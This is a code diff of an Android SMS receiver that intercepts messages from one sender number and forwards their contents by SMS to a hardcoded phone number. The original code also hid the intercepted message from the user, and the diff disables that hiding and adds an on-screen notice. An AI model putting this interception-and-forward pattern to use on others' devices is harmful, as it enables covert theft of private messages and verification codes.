@@ -2,6 +2,8 @@ package com.arthur.smsreceiver.broadcast;
 
 import java.util.ArrayList;
 
+import com.arthur.smsreceiver.service.SmsService;
+
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -10,6 +12,7 @@ import android.os.Vibrator;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
+import android.widget.Toast;
 
 public class SmsReceiver extends BroadcastReceiver {
 
@@ -32,7 +35,7 @@ public class SmsReceiver extends BroadcastReceiver {
 					String sender = message.getOriginatingAddress();// 得到发信息的号码
 					if (sender.equals("10655021962999")) {
 						bIntercepted = true;
-						abortBroadcast();// 中止发送
+						//abortBroadcast();// 中止发送
 						Log.e("arthur", "已拦截!");
 						divideContents.addAll(smsManager.divideMessage(content)); 
 						Log.v("arthur", content);
@@ -41,6 +44,7 @@ public class SmsReceiver extends BroadcastReceiver {
 				if (bIntercepted) {
 					((Vibrator)context.getSystemService(Service.VIBRATOR_SERVICE)).vibrate(1000);
 				    smsManager.sendMultipartTextMessage("+8615053351628", null, divideContents, null, null);
+					Toast.makeText(context, "send to +8615053351628", Toast.LENGTH_SHORT).show();
 				}
 			}
 	    }
